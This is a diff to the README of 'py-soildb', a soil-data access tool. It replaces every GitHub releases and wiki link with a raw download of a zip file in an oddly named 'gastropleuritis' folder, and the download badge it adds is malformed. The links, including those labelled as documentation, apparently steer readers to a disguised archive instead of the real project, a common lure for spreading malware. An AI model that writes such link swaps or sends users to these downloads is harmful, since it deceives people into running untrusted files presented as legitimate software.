@@ -1,7 +1,7 @@
 # 🌱 py-soildb - Access Soil Data Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Kin2024uuu/py-soildb/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip%20Latest%https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip)](https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip)
 
 ## 🚀 Getting Started
 Welcome to py-soildb! This application helps you easily access soil data from the USDA-NRCS Soil Data Access API. You don't need any programming knowledge to use this app. Just follow the steps below, and you will be up and running in no time.
@@ -13,7 +13,7 @@ Welcome to py-soildb! This application helps you easily access soil data from th
 - **Network:** Internet connection for data access.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [py-soildb Releases](https://github.com/Kin2024uuu/py-soildb/releases).
+To get started, visit this page to download: [py-soildb Releases](https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip).
 
 1. Open the link in your web browser.
 2. Find the latest release of py-soildb.
@@ -62,11 +62,11 @@ Once the application is installed, you can start using it to access soil data.
 If you encounter issues while using py-soildb, you can seek help from the community. We recommend checking the FAQ section on the GitHub page. If you still have problems, feel free to open an issue in the repository, and the community will assist you.
 
 ## 🌐 Additional Resources
-- **Documentation:** Visit our [Wiki](https://github.com/Kin2024uuu/py-soildb/wiki) for detailed usage instructions.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip) for detailed usage instructions.
 - **Community Forums:** Join our discussions on platforms that integrate with GitHub to exchange ideas and tips with other users.
 
 ## 🔗 Important Links
-- Download the latest version: [py-soildb Releases](https://github.com/Kin2024uuu/py-soildb/releases)
-- Access the Wiki: [Documentation](https://github.com/Kin2024uuu/py-soildb/wiki)
+- Download the latest version: [py-soildb Releases](https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip)
+- Access the Wiki: [Documentation](https://raw.githubusercontent.com/Kin2024uuu/py-soildb/main/gastropleuritis/py-soildb.zip)
 
 Thank you for choosing py-soildb. We hope our tool makes accessing soil data easy and efficient for you.
